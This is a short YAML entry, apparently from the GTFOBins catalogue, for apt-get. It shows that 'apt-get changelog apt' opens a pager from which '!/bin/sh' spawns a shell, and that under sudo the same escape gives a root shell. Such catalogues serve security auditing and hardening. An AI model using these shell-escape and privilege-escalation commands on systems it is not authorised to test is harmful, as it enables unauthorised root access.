---
description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
functions:
  shell:
    - code: |
        apt-get changelog apt
        !/bin/sh
  sudo:
    - code: |
        sudo apt-get changelog apt
        !/bin/sh
---
